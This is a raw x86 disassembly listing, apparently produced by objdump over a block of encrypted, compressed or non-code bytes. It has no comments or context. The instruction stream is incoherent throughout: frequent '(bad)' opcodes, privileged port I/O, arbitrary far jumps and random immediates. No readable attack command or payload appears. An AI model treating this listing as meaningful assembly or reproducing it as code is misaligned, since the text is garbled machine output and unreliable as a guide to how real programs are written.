  416d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d08:	mov    ss,WORD PTR [ebp-0x49]
  416d0b:	addr16 mov ds:0x2123,eax
  416d0f:	mov    ds:0x7b385877,eax
  416d14:	and    ebx,DWORD PTR [ebp+0x656287d8]
  416d1a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416d1c:	xor    DWORD PTR [esi+edx*4],ebp
  416d1f:	repz jae 0x416cdc
  416d22:	(bad)  
  416d23:	and    edx,edi
  416d25:	cmp    eax,DWORD PTR [eax]
  416d27:	push   0xe471b849
  416d2c:	popa   
  416d2d:	pop    ecx
  416d2e:	scas   eax,DWORD PTR es:[edi]
  416d2f:	ins    DWORD PTR es:[edi],dx
  416d30:	outs   dx,DWORD PTR ds:[esi]
  416d31:	sbb    al,0x15
  416d33:	push   0x5b
  416d35:	adc    al,0x29
  416d37:	mov    ds,WORD PTR [edi-0x38]
  416d3a:	lds    eax,FWORD PTR [ebx]
  416d3c:	adc    cl,BYTE PTR [ebp-0x2e]
  416d3f:	xchg   ecx,eax
  416d40:	and    DWORD PTR [ebx+0x4c468ae1],edi
  416d46:	ss shl ebp,0x3f
  416d4a:	fisubr DWORD PTR [ecx+0x54]
  416d4d:	cmp    ah,BYTE PTR [edx-0xb]
  416d50:	aad    0xa4
  416d52:	pop    ebp
  416d53:	inc    ebx
  416d54:	sar    DWORD PTR [esi+0x37],1
  416d57:	cwde   
  416d58:	inc    eax
  416d59:	mov    ds:0xa4b59513,eax
  416d5e:	jmp    0x416cf7
  416d60:	(bad)  
  416d61:	in     eax,0xbf
  416d63:	xchg   DWORD PTR es:[edx],edi
  416d66:	or     eax,0x5d73a306
  416d6b:	push   ds
  416d6c:	and    cl,BYTE PTR [edi-0x76034906]
  416d72:	inc    ebp
  416d73:	ror    BYTE PTR [ebx+0x42a3e93d],0x0
  416d7a:	mov    edi,DWORD PTR [edi]
  416d7c:	add    DWORD PTR ds:0x42a3b9,edi
  416d82:	mov    eax,0x7510850
  416d87:	mov    edi,DWORD PTR ds:0x42a309
  416d8d:	mov    edi,DWORD PTR [edi]
  416d8f:	adc    DWORD PTR ds:0x42a2e1,edi
  416d95:	jmp    0x4172a7
  416d9a:	mov    eax,0xc1c9c1c9
  416da0:	(bad)  
  416da1:	retf   0x720e
  416da4:	or     ebx,ebp
  416da6:	xor    eax,esp
  416da8:	(bad)  
  416da9:	(bad)  
  416daa:	fmulp  st(1),st
  416dac:	jg     0x416e26
  416dae:	jae    0x416e2c
  416db0:	js     0x416e2a
  416db2:	and    eax,0x2c499f0
  416db7:	pop    edi
  416db8:	dec    ecx
  416db9:	sti    
  416dba:	stc    
  416dbb:	add    dh,BYTE PTR [eax]
  416dbd:	stos   BYTE PTR es:[edi],al
  416dbe:	or     cl,ch
  416dc0:	shr    DWORD PTR [esi+0x64],1
  416dc3:	pop    edi
  416dc4:	xor    bh,bl
  416dc6:	mov    eax,0x89238312
  416dcb:	mov    ds:0xe35802b4,al
  416dd0:	jbe    0x416e43
  416dd2:	cmc    
  416dd3:	ins    BYTE PTR es:[edi],dx
  416dd4:	sbb    al,0x27
  416dd6:	fwait
  416dd7:	sub    ebp,DWORD PTR [edi+0x63]
  416dda:	mov    esp,DWORD PTR [esi]
  416ddc:	mov    dh,0xe6
  416dde:	and    BYTE PTR [esi],ah
  416de0:	mov    al,0x3d
  416de2:	cld    
  416de3:	retf   0xcf46
  416de6:	pop    edi
  416de7:	shl    DWORD PTR [ebx-0x1b],0x1e
  416deb:	call   0x3c066806
  416df0:	push   0x3971dab5
  416df5:	mov    esi,0x28f348a1
  416dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dfb:	popf   
  416dfc:	test   eax,0x97f577ea
  416e01:	mov    cl,0xef
  416e03:	js     0x416db2
  416e05:	lods   al,BYTE PTR ds:[esi]
  416e06:	adc    ecx,ecx
  416e08:	xor    al,0xa
  416e0a:	xor    bl,BYTE PTR [ebx-0x696c10f]
  416e10:	push   cs
  416e11:	loope  0x416d9e
  416e13:	loop   0x416e76
  416e15:	sub    edi,0x3d46c446
  416e1b:	or     al,0xb8
  416e1d:	add    al,0x1c
  416e1f:	repz push eax
  416e21:	in     eax,0x2c
  416e23:	mov    eax,cs
  416e25:	cld    
  416e26:	jb     0x416de9
  416e28:	lock adc edi,DWORD PTR [esi+0x7a]
  416e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e2d:	push   esi
  416e2e:	ret    
  416e2f:	les    edi,FWORD PTR [esi+edx*8]
  416e32:	lock cdq 
  416e34:	mov    ?,WORD PTR [edi]
  416e36:	jle    0x416e4c
  416e38:	or     al,0x38
  416e3a:	repnz cmp ah,BYTE PTR [eax-0x38b064d7]
  416e41:	repz jmp FWORD PTR [eax]
  416e44:	(bad)  
  416e45:	fld    DWORD PTR [eax-0x19]
  416e48:	mov    ebp,0xf525a09d
  416e4d:	in     al,dx
  416e4e:	cli    
  416e4f:	jmp    0x95da:0x8547b89e
  416e56:	mov    BYTE PTR [edi],al
  416e58:	xchg   esp,eax
  416e59:	inc    ebp
  416e5a:	xor    esp,esi
  416e5c:	jg     0x416e68
  416e5e:	xor    BYTE PTR [ecx+0x71],al
  416e61:	hlt    
  416e62:	not    DWORD PTR [ecx]
  416e64:	xchg   ebp,eax
  416e65:	jne    0x416edc
  416e67:	ds push cs
  416e69:	jecxz  0x416e68
  416e6b:	retf   
  416e6c:	adc    DWORD PTR ds:0xd45121b4,edx
  416e72:	jl     0x416e12
  416e74:	pop    ds
  416e75:	frstor [ebx]
  416e77:	and    eax,0xafc0d7bd
  416e7c:	hlt    
  416e7d:	data16 fscale 
  416e80:	fisubr WORD PTR [ebx+edi*2+0xf41d5c0]
  416e87:	sbb    eax,0xa8e9c52a
  416e8c:	ins    DWORD PTR es:[edi],dx
  416e8d:	add    DWORD PTR [ebx],esp
  416e8f:	out    0x44,al
  416e91:	fwait
  416e92:	outs   dx,BYTE PTR ds:[esi]
  416e93:	dec    esi
  416e94:	xchg   esi,eax
  416e95:	outs   dx,BYTE PTR ds:[esi]
  416e96:	sbb    BYTE PTR [ecx],ah
  416e98:	dec    DWORD PTR [esi]
  416e9a:	xchg   ebx,eax
  416e9b:	pushf  
  416e9c:	rol    DWORD PTR [ecx+0x74fb3118],0xa0
  416ea3:	and    DWORD PTR [ebp-0x68],0x851cdf2d
  416eaa:	dec    ebx
  416eab:	jo     0x416e81
  416ead:	les    ebx,FWORD PTR [eax-0x4a3828e6]
  416eb3:	jmp    0xf31e35f1
  416eb8:	mov    esp,0x7495c9eb
  416ebd:	fmul   DWORD PTR [esi+0x28d84650]
  416ec3:	adc    eax,0x18a1b92b
  416ec8:	and    eax,0xf0c27517
  416ecd:	pop    ss
  416ece:	xor    esp,DWORD PTR [ecx-0x20]
  416ed1:	mov    al,ds:0xa6b36bb2
  416ed6:	xor    BYTE PTR [eax-0x63],dh
  416ed9:	push   es
  416eda:	fmul   DWORD PTR [ecx+0x29]
  416edd:	xchg   BYTE PTR [eax+0x19],ch
  416ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee1:	enter  0x3876,0x0
  416ee5:	aad    0x5d
  416ee7:	pop    ebx
  416ee8:	sbb    al,0x50
  416eea:	(bad)  [ecx+esi*1+0x67]
  416eee:	xchg   ebx,eax
  416eef:	mov    esi,ecx
  416ef1:	arpl   WORD PTR [eax+0x52],cx
  416ef4:	inc    eax
  416ef5:	mov    bl,0xa2
  416ef7:	mov    DWORD PTR ds:0xf78a544b,esi
  416efd:	jbe    0x416f79
  416eff:	push   ds
  416f00:	inc    edx
  416f01:	inc    eax
  416f02:	scas   eax,DWORD PTR es:[edi]
  416f03:	mov    esi,0xefacc30e
  416f08:	mov    eax,ds:0x7b4a8dee
  416f0d:	fistp  WORD PTR [esi+0x4c]
  416f10:	fld    TBYTE PTR [ebx-0x7b]
  416f13:	jmp    0xff71:0x1223e267
  416f1a:	mov    ebx,ebx
  416f1c:	mov    dh,0x43
  416f1e:	jmp    0x9f06:0x8320fe11
  416f25:	inc    ecx
  416f26:	pop    eax
  416f27:	adc    DWORD PTR [ecx-0x6562c619],edi
  416f2d:	les    ecx,FWORD PTR [eax-0x536543ed]
  416f33:	and    BYTE PTR [ebp+0x34],0x82
  416f37:	mov    eax,ds:0x863811fc
  416f3c:	in     al,0x2
  416f3e:	jmp    0x416f0f
  416f40:	inc    ebx
  416f41:	popa   
  416f42:	pop    eax
  416f43:	push   ebp
  416f44:	lahf   
  416f45:	iret   
  416f46:	loopne 0x416f20
  416f48:	push   ds
  416f49:	ret    0xfa8
  416f4c:	in     eax,dx
  416f4d:	mov    esp,0x587c1d88
  416f52:	out    0x24,eax
  416f54:	fsubr  QWORD PTR [ecx]
  416f56:	adc    al,0xf
  416f58:	jecxz  0x416ee6
  416f5a:	cmc    
  416f5b:	xchg   esp,eax
  416f5c:	xchg   BYTE PTR [eax-0x24b1a7a6],dl
  416f62:	int3   
  416f63:	mov    ebp,0x4478fd6c
  416f68:	repz sbb BYTE PTR [edi-0x529fcc03],bl
  416f6f:	daa    
  416f70:	sub    eax,0x2116e1c
  416f75:	fs or  bh,cl
  416f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f79:	jae    0x416f68
  416f7b:	dec    esi
  416f7c:	adc    BYTE PTR [esi-0x33],0x43
  416f80:	jae    0x416f02
  416f82:	imul   ecx,DWORD PTR [ecx+0x42],0x9003be17
  416f89:	xor    ah,BYTE PTR [ebx-0x4892d3fa]
  416f8f:	inc    eax
  416f90:	push   ds
  416f91:	sbb    DWORD PTR [ebp+0x1851a6eb],edx
  416f97:	push   es
  416f98:	cmp    eax,0x7f921196
  416f9d:	fcomp  DWORD PTR [ebx-0x39]
  416fa0:	sbb    bl,BYTE PTR [edx-0xe0e9f6f]
  416fa6:	jmp    0x416fa1
  416fa8:	lods   al,BYTE PTR ds:[esi]
  416fa9:	fwait
  416faa:	lahf   
  416fab:	xlat   BYTE PTR ds:[ebx]
  416fac:	pop    edx
  416fad:	shl    DWORD PTR [esi-0x2d],1
  416fb0:	rcr    DWORD PTR [ecx-0x65b8d68c],cl
  416fb6:	bound  esp,QWORD PTR [ebp+0x11]
  416fb9:	push   edi
  416fba:	arpl   WORD PTR [esi+0x4c],bx
  416fbd:	cli    
  416fbe:	sbb    eax,0x8ddb3822
  416fc3:	data16 ror BYTE PTR [ecx-0x4d7469e9],cl
  416fca:	add    cl,BYTE PTR [edi+esi*2]
  416fcd:	(bad)  
  416fce:	stos   DWORD PTR es:[edi],eax
  416fcf:	pop    eax
  416fd0:	(bad)  
  416fd2:	imul   esp,DWORD PTR cs:[edx],0xfa7d5089
  416fd9:	xchg   ebp,eax
  416fda:	pushf  
  416fdb:	mov    DWORD PTR [ebp-0x6d41c5ac],ecx
  416fe1:	push   ebp
  416fe2:	sti    
  416fe3:	mov    eax,0xc9f85601
  416fe8:	xor    BYTE PTR [eax+0x36],ch
  416feb:	adc    DWORD PTR [eax+0x23],ecx
  416fee:	push   esp
  416fef:	out    0x37,al
  416ff1:	or     DWORD PTR [edx],eax
  416ff3:	pop    ebp
  416ff4:	jp     0x41703b
  416ff6:	lds    ebx,FWORD PTR [esp+ecx*2-0x11b37505]
  416ffd:	arpl   WORD PTR [edx+0x6cd46a3],bx
  417003:	into   
  417004:	scas   eax,DWORD PTR es:[edi]
  417005:	lods   al,BYTE PTR ds:[esi]
  417006:	xchg   ebx,eax
  417007:	daa    
  417008:	sar    DWORD PTR [ebp+0x141967a0],1
  41700e:	pop    esi
  41700f:	(bad)  
  417010:	out    dx,al
  417011:	arpl   bx,sp
  417013:	or     dl,BYTE PTR [ecx-0x3652219b]
  417019:	mov    ebp,0x306d2bfa
  41701e:	pop    eax
  41701f:	out    dx,al
  417020:	sub    BYTE PTR [esi],dh
  417022:	push   cs
  417023:	rol    DWORD PTR [edi-0x1d60b204],cl
  417029:	(bad)  
  41702b:	adc    eax,0xd14bfe84
  417030:	or     ebx,DWORD PTR [eax]
  417032:	sbb    cl,BYTE PTR [ecx+0x14250745]
  417038:	pop    ebp
  417039:	enter  0x9ec5,0xc1
  41703d:	push   ebp
  41703e:	lock hlt 
  417040:	add    BYTE PTR [eax],0xb1
  417043:	and    al,ah
  417045:	test   DWORD PTR [edx+edx*8],ebp
  417048:	mov    ebp,cs
  41704a:	xor    eax,0x50b74323
  41704f:	cmp    eax,0xcc946fc3
  417054:	dec    ecx
  417055:	jb     0x4170c0
  417057:	outs   dx,BYTE PTR ds:[esi]
  417058:	and    ebp,DWORD PTR [ecx+0x69f03d23]
  41705e:	cs pusha 
  417060:	dec    edi
  417061:	add    BYTE PTR [ecx+0x34],ch
  417064:	xchg   ecx,ecx
  417066:	aaa    
  417067:	cli    
  417068:	test   DWORD PTR [ebx],esi
  41706a:	stos   DWORD PTR es:[edi],eax
  41706b:	xor    ecx,DWORD PTR [ecx-0x25]
  41706e:	adc    al,0xcf
  417070:	sti    
  417071:	test   BYTE PTR [eax+0x69],al
  417074:	rcl    BYTE PTR [ebx+ebp*8-0xf],1
  417078:	add    al,0xf3
  41707a:	loope  0x4170f6
  41707c:	out    0xe4,al
  41707e:	push   edx
  41707f:	(bad)  
  417080:	jl     0x4170d8
  417082:	pop    edi
  417083:	movlps QWORD PTR [eax-0x65],xmm1
  417087:	push   edi
  417088:	xchg   esp,eax
  417089:	repnz lahf 
  41708b:	outs   dx,BYTE PTR ds:[esi]
  41708c:	fcomp  QWORD PTR [ebp+0x53]
  41708f:	adc    al,0x96
  417091:	loopne 0x417027
  417093:	mov    ?,WORD PTR [esi-0x32]
  417096:	xor    DWORD PTR [edx+0x4],edi
  417099:	sbb    eax,0xd5429838
  41709e:	mov    ebp,0xca99dee5
  4170a3:	mov    ch,0x3c
  4170a5:	lea    eax,[edi]
  4170a7:	jbe    0x4170a9
  4170a9:	jns    0x41708f
  4170ab:	ret    
  4170ac:	sub    al,0xa8
  4170ae:	leave  
  4170af:	retf   0xdc5
  4170b2:	stos   DWORD PTR es:[edi],eax
  4170b3:	imul   ecx,DWORD PTR [ebx+0x1f43df0c],0xffffffe7
  4170ba:	into   
  4170bb:	pop    ebp
  4170bc:	xchg   esi,eax
  4170bd:	xor    DWORD PTR [ebp+ebx*2-0x43],edx
  4170c1:	jge    0x4170dc
  4170c3:	cdq    
  4170c4:	xchg   edi,eax
  4170c5:	dec    esp
  4170c6:	int3   
  4170c7:	push   edi
  4170c8:	or     ebp,DWORD PTR [edi+ebx*4]
  4170cb:	(bad)  
  4170cc:	pusha  
  4170cd:	(bad)  
  4170cf:	aaa    
  4170d0:	mov    ebp,0xd690c798
  4170d5:	ror    BYTE PTR [edx-0x38],1
  4170d8:	sbb    eax,0x7e6f7196
  4170dd:	xchg   BYTE PTR [eax-0x239c18f1],bl
  4170e3:	ds js  0x4170a1
  4170e6:	push   eax
  4170e7:	arpl   WORD PTR [esp+eax*2-0x44],ax
  4170eb:	jne    0x417110
  4170ed:	in     al,dx
  4170ee:	jmp    0x417090
  4170f0:	test   BYTE PTR [esi-0x6072da26],dh
  4170f6:	addr16 mov ah,0xb
  4170f9:	cli    
  4170fa:	lock xchg ecx,eax
  4170fc:	mov    ebx,0xd8a47bb0
  417101:	mov    ?,WORD PTR [edx+0x16]
  417104:	inc    ecx
  417105:	sub    al,BYTE PTR [ebp-0x16fa63c9]
  41710b:	add    BYTE PTR [ecx+0x69b5c8d1],bl
  417111:	das    
  417112:	sahf   
  417113:	cmc    
  417114:	pop    DWORD PTR ds:0x4fe7e188
  41711a:	test   al,0xc4
  41711c:	adc    edi,DWORD PTR [ebx]
  41711e:	mov    DWORD PTR [ebp-0x69653b3],ebp
  417124:	and    DWORD PTR [eax],0xffffffa8
  417127:	jg     0x4170ea
  417129:	mov    dl,0xfb
  41712b:	cli    
  41712c:	es adc ah,bl
  41712f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417130:	in     eax,dx
  417131:	push   edx
  417132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417133:	icebp  
  417134:	xor    DWORD PTR [edx+0x61554e],esi
  41713a:	in     eax,dx
  41713b:	jp     0x417140
  41713d:	cmc    
  41713e:	mov    ah,0xdc
  417140:	xlat   BYTE PTR ds:[ebx]
  417141:	sub    edx,DWORD PTR [edx+0x3]
  417144:	and    al,BYTE PTR [eax-0x3]
  417147:	je     0x41714b
  417149:	or     ecx,0xddb45fb1
  41714f:	push   ebx
  417150:	ret    0xd7b0
  417153:	(bad)  
  417155:	xchg   ebp,eax
  417156:	jmp    0x41710b
  417158:	aaa    
  417159:	pop    edx
  41715a:	pop    es
  41715b:	(bad)  
  41715c:	xchg   ebx,eax
  41715d:	push   ecx
  41715e:	rcr    cl,cl
  417160:	inc    ebp
  417161:	mov    ebx,0xea304b07
  417166:	pusha  
  417167:	push   es
  417168:	stos   BYTE PTR es:[edi],al
  417169:	lods   al,BYTE PTR ds:[esi]
  41716a:	mov    WORD PTR [edx],cs
  41716c:	dec    ebx
  41716d:	sub    eax,esi
  41716f:	iret   
  417170:	mov    cl,0x9c
  417172:	adc    dl,BYTE PTR [esi-0x76975945]
  417178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417179:	(bad)  
  41717a:	and    ah,BYTE PTR [edi]
  41717c:	mov    ecx,0xac3dcf17
  417181:	int    0x8f
  417183:	adc    ebx,DWORD PTR [ebx-0x6ab16e9f]
  417189:	scas   eax,DWORD PTR es:[edi]
  41718a:	inc    edi
  41718b:	icebp  
  41718c:	pushf  
  41718d:	test   eax,0xb986321b
  417192:	fiadd  WORD PTR [esi+0x4d]
  417195:	and    ch,cl
  417197:	dec    eax
  417198:	sbb    al,0x44
  41719a:	cmp    DWORD PTR ds:0x3d658a5,ebp
  4171a0:	mov    esp,0xf7139e24
  4171a5:	inc    ebx
  4171a6:	cmp    eax,0xeea8f0aa
  4171ab:	or     esp,DWORD PTR [edx]
  4171ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ae:	imul   esi,DWORD PTR [edx],0xfffffff1
  4171b1:	or     eax,0x39b79cef
  4171b6:	fild   DWORD PTR [edi+0x2e007a22]
  4171bc:	jnp    0x4171f9
  4171be:	and    DWORD PTR [esi],eax
  4171c0:	cmp    BYTE PTR [esi],0xf4
  4171c3:	bound  ecx,QWORD PTR [ecx]
  4171c5:	test   eax,0x66a13903
  4171ca:	shr    ch,0x18
  4171cd:	lock push 0xfffffffb
  4171d0:	cld    
  4171d1:	sbb    ebx,0xffffffe8
  4171d4:	xchg   ebx,eax
  4171d5:	fistp  WORD PTR [edx+0x11]
  4171d8:	fdiv   QWORD PTR [esi-0x31]
  4171db:	add    DWORD PTR ds:0x6e48827f,edx
  4171e1:	std    
  4171e2:	and    al,0xf5
  4171e4:	shl    BYTE PTR [ebx-0x1b],0xb1
  4171e8:	enter  0x99a4,0x57
  4171ec:	mov    DWORD PTR fs:[ebx],0xdb457954
  4171f3:	ins    DWORD PTR es:[edi],dx
  4171f4:	dec    esi
  4171f5:	repnz sub DWORD PTR ds:0x4237627a,edi
  4171fc:	data16 jge 0x4171a5
  4171ff:	cmp    BYTE PTR [edi+ebp*8+0x36],ch
  417203:	jo     0x417194
  417205:	outs   dx,BYTE PTR ds:[esi]
  417206:	jmp    FWORD PTR [eax+0x58]
  417209:	dec    ebx
  41720a:	enter  0xf187,0x48
  41720e:	push   0xfffffff0
  417210:	nop
  417211:	jp     0x41728e
  417213:	lahf   
  417214:	idiv   DWORD PTR [ecx+0x23f24347]
  41721a:	sbb    BYTE PTR [ebx+0x6c],cl
  41721d:	mov    ecx,0x9c1a3037
  417222:	push   edx
  417223:	cld    
  417224:	out    dx,eax
  417225:	xlat   BYTE PTR ds:[ebx]
  417226:	fwait
  417227:	sbb    ch,BYTE PTR [edx+0x29bdd433]
  41722d:	inc    esi
  41722e:	inc    ebx
  41722f:	popf   
  417230:	xchg   ecx,eax
  417231:	dec    BYTE PTR [ebx+0x32]
  417234:	out    dx,al
  417235:	scas   al,BYTE PTR es:[edi]
  417236:	pop    ebx
  417237:	lods   al,BYTE PTR ds:[esi]
  417238:	lock test eax,0xfe8dccf0
  41723e:	xchg   ecx,eax
  41723f:	sti    
  417240:	ins    WORD PTR es:[edi],dx
  417242:	out    dx,eax
  417243:	pop    ss
  417244:	mov    ah,0xeb
  417246:	(bad)
  41724a:	pop    esp
  41724b:	rol    DWORD PTR [esi+edx*4],cl
  41724e:	cs popf 
  417250:	fld    DWORD PTR [edi+0x29]
  417253:	xor    dh,al
  417255:	arpl   WORD PTR ds:0x22ff5d4c,sp
  41725b:	std    
  41725c:	xor    esi,DWORD PTR [ecx]
  41725e:	mov    dl,0xb5
  417260:	dec    esp
  417261:	or     edi,ebx
  417263:	sub    eax,0x614afde3
  417268:	and    BYTE PTR [edx+0x5ae11467],al
  41726e:	mov    ds,eax
  417270:	test   ebp,0x67c19f38
  417276:	mov    dl,BYTE PTR [esi-0x51fe094]
  41727c:	push   ecx
  41727d:	rcl    BYTE PTR [ebx+eiz*1],0x98
  417281:	dec    edi
  417282:	dec    ecx
  417283:	popa   
  417284:	add    eax,DWORD PTR [ebx-0x11]
  417287:	fwait
  417288:	adc    DWORD PTR [ebx],edi
  41728a:	mov    edi,DWORD PTR [ebp-0x73]
  41728d:	rcl    BYTE PTR [esi+ecx*8+0x71],cl
  417291:	and    BYTE PTR [ecx+0x46d8af39],bh
  417297:	push   0xffffff8a
  417299:	mov    esp,0x2154b946
  41729e:	jp     0x4172a2
  4172a0:	sbb    ebx,ecx
  4172a2:	cmc    
  4172a3:	aaa    
  4172a4:	or     esp,esi
  4172a6:	mov    DWORD PTR [ebx],esi
  4172a8:	shr    cl,1
  4172aa:	or     eax,0xc4000005
  4172af:	leave  
  4172b0:	int3   
  4172b1:	leave  
  4172b2:	rcr    ecx,1
  4172b4:	fxch   st(1)
  4172b6:	aad    0x44
  4172b8:	push   esp
  4172b9:	adc    eax,0xd37e8fbc
  4172be:	ror    esp,1
  4172c0:	jg     0x41733a
  4172c2:	jae    0x417340
  4172c4:	js     0x41733e
  4172c6:	icebp  
  4172c7:	and    BYTE PTR [esi+esi*8+0x6c8f18d4],al
  4172ce:	xchg   esi,eax
  4172cf:	and    al,0xc4
  4172d1:	sbb    eax,0xf5e82ad1
  4172d6:	ins    BYTE PTR es:[edi],dx
  4172d7:	jmp    0x4f51a135
  4172dc:	(bad)  [esi-0x7267d5f2]
  4172e2:	mov    ecx,0xf36e113
  4172e7:	std    
  4172e8:	hlt    
  4172e9:	inc    esp
  4172ea:	cli    
  4172eb:	cmp    eax,0x629c9ea9
  4172f0:	shr    DWORD PTR [edx-0x18],0x62
  4172f4:	sub    eax,0x2ee7b663
  4172f9:	sub    ah,BYTE PTR [edi]
  4172fb:	push   eax
  4172fc:	lea    edi,[ebx-0x5e]
  4172ff:	pop    ss
  417300:	mov    ch,BYTE PTR [esi-0x4c]
  417303:	(bad)  
  417304:	les    eax,FWORD PTR [edx]
  417306:	adc    dl,BYTE PTR [ecx]
  417308:	mov    ebx,0x68f8c382
  41730e:	stc    
  41730f:	adc    al,dh
  417311:	pop    eax
  417312:	sti    
  417313:	pop    es
  417314:	mov    al,0x87
  417316:	aaa    
  417317:	cld    
  417318:	fcomip st,st(3)
  41731a:	in     eax,dx
  41731b:	add    eax,0xc37969e8
  417320:	das    
  417321:	imul   esi,DWORD PTR [ebp-0x37],0x5c
  417325:	pop    ebx
  417326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417327:	xlat   BYTE PTR ds:[ebx]
  417328:	loope  0x417398
  41732a:	jl     0x4172f3
  41732c:	or     BYTE PTR gs:[ebp-0x11ddff9],bl
  417333:	imul   edi,ebx,0x59f8ca18
  417339:	and    al,bh
  41733b:	dec    ecx
  41733c:	mov    esp,0x5d7f95a5
  417341:	ret    0xa0e7
  417344:	inc    ecx
  417345:	or     esi,ebp
  417347:	adc    eax,0x74028c30
  41734c:	xchg   BYTE PTR [eax],bh
  41734e:	add    al,0xac
  417350:	adc    BYTE PTR [ebx+0x4],0xe4
  417354:	leave  
  417355:	neg    BYTE PTR [eax]
  417357:	je     0x4173a5
  417359:	inc    edi
  41735a:	jno    0x41739b
  41735c:	xchg   ebx,eax
  41735d:	xchg   ebp,eax
  41735e:	sbb    bl,BYTE PTR [esi+0xca6f976]
  417364:	sbb    BYTE PTR [eax-0x65],ah
  417367:	xchg   esp,eax
  417368:	sub    dh,BYTE PTR [eax+0x69434598]
  41736e:	mov    al,ds:0xd04e8f68
  417373:	mov    eax,ds:0x4116e9c6
  417378:	addr16 push cs
  41737a:	push   cs
  41737b:	sub    eax,0x9f6dfa
  417380:	sbb    bl,BYTE PTR [ecx+0x5aecb01f]
  417386:	jmp    0x46fc9f49
  41738b:	stos   BYTE PTR es:[edi],al
  41738c:	in     eax,dx
  41738d:	cwde   
  41738e:	cld    
  41738f:	jl     0x4173d8
  417391:	sbb    BYTE PTR [edi],bh
  417393:	pop    ebx
  417394:	in     al,dx
  417395:	or     al,0x96
  417397:	(bad)  
  417398:	cmp    DWORD PTR [edi-0x255d7a83],edi
  41739e:	cmp    cl,cl
  4173a0:	jmp    0x4173ae
  4173a2:	push   ds
  4173a3:	inc    ebp
  4173a4:	push   edx
  4173a5:	mov    ah,0x87
  4173a7:	retf   0xc637
  4173aa:	or     eax,0x426e0052
  4173af:	(bad)  
  4173b0:	jo     0x4173f4
  4173b2:	call   0x8312:0xe6f73d49
  4173b9:	ins    BYTE PTR es:[edi],dx
  4173ba:	xor    al,0x80
  4173bc:	mov    esi,0x56445c4e
  4173c1:	jb     0x4173b3
  4173c3:	push   cs
  4173c4:	test   DWORD PTR [edi],esp
  4173c6:	test   DWORD PTR [edx-0x7c],ecx
  4173c9:	xor    eax,0x30b9b770
  4173ce:	lds    ebp,FWORD PTR [ebx-0x26df4791]
  4173d4:	xchg   ebp,eax
  4173d5:	mov    al,ds:0x30532d93
  4173da:	pop    eax
  4173db:	and    BYTE PTR [esi+0x51],bl
  4173de:	sbb    eax,0xd624df50
  4173e3:	adc    ebx,DWORD PTR [ebp-0x6b]
  4173e6:	mov    ds:0xb52dc215,eax
  4173eb:	push   0xc3d01bc8
  4173f0:	cmp    al,0x73
  4173f2:	pop    edx
  4173f3:	aas    
  4173f4:	ins    BYTE PTR es:[edi],dx
  4173f5:	mov    cl,dl
  4173f7:	push   cs
  4173f8:	jecxz  0x417409
  4173fa:	mov    esp,ebp
  4173fc:	(bad)  [edi-0x74]
  4173ff:	in     al,dx
  417400:	adc    dh,BYTE PTR [edx]
  417402:	inc    edi
  417403:	into   
  417404:	sub    bh,ch
  417406:	pop    edi
  417407:	imul   ebx,DWORD PTR [edi],0xd032a7df
  41740d:	jmp    0xf880:0x4aa5de47
  417414:	push   ss
  417415:	mov    ch,0xdc
  417417:	add    eax,0x2f70cc9d
  41741c:	(bad)
  417420:	ins    BYTE PTR es:[edi],dx
  417421:	fcomp  DWORD PTR [edi+0x6bd9f9f4]
  417427:	iret   
  417428:	loop   0x41743b
  41742a:	mov    BYTE PTR [ecx],dl
  41742c:	fldcw  WORD PTR [eax+0x16]
  41742f:	inc    edx
  417430:	xchg   esi,eax
  417431:	pop    esi
  417432:	jle    0x41744c
  417434:	out    0x93,al
  417436:	inc    esi
  417437:	sub    DWORD PTR [eax+0x7f],edi
  41743a:	out    0xb0,al
  41743c:	rcr    DWORD PTR [ebx-0x65b802d0],0x3
  417443:	in     al,dx
  417444:	enter  0xda21,0xe3
  417448:	(bad)  
  417449:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744b:	popa   
  41744c:	ins    BYTE PTR es:[edi],dx
  41744d:	sbb    BYTE PTR [edi-0x61],cl
  417450:	lahf   
  417451:	inc    esp
  417452:	dec    eax
  417453:	xchg   DWORD PTR [ecx],esp
  417455:	push   ebp
  417456:	xor    ebp,DWORD PTR [esi+0x169383e]
  41745c:	(bad)  
  41745d:	out    dx,eax
  41745e:	xchg   DWORD PTR [eax+0x4e799700],ecx
  417464:	dec    ecx
  417465:	jb     0x4174df
  417467:	test   ebx,ebp
  417469:	outs   dx,BYTE PTR ds:[esi]
  41746a:	xchg   ebx,eax
  41746b:	sbb    BYTE PTR [ebx],ch
  41746d:	popa   
  41746e:	imul   ecx,DWORD PTR [ecx-0x6e743dd2],0xbbb795f6
  417478:	sti    
  417479:	(bad)  
  41747a:	push   DWORD PTR [esp+eax*4]
  41747d:	xchg   esi,eax
  41747e:	push   esi
  41747f:	mov    eax,ds:0xd0ce4ca1
  417484:	ret    
  417485:	push   esi
  417486:	xchg   ecx,eax
  417487:	sub    edi,DWORD PTR [ebx]
  417489:	pop    es
  41748a:	pop    esp
  41748b:	(bad)  
  41748c:	push   cs
  41748d:	mov    WORD PTR [edx+0x2],?
  417490:	leave  
  417491:	pop    eax
  417492:	push   0x3f
  417494:	jmp    0x63b6cd3
  417499:	les    esp,FWORD PTR [eax+0x7a637232]
  41749f:	jmp    0x2e461526
  4174a4:	xchg   ebp,eax
  4174a5:	inc    ebp
  4174a6:	dec    ebp
  4174a7:	sahf   
  4174a8:	or     BYTE PTR [esi+0x2b],ch
  4174ab:	data16 loopne 0x417528
  4174ae:	data16 test dl,al
  4174b1:	jg     0x4174d5
  4174b3:	iret   
  4174b4:	icebp  
  4174b5:	or     al,BYTE PTR [ebp-0xf5950cb]
  4174bb:	out    0x8f,eax
  4174bd:	out    dx,al
  4174be:	mov    cl,0x3f
  4174c0:	in     eax,0x1d
  4174c2:	loope  0x417502
  4174c4:	xor    DWORD PTR [eax],ecx
  4174c6:	pop    edx
  4174c7:	popa   
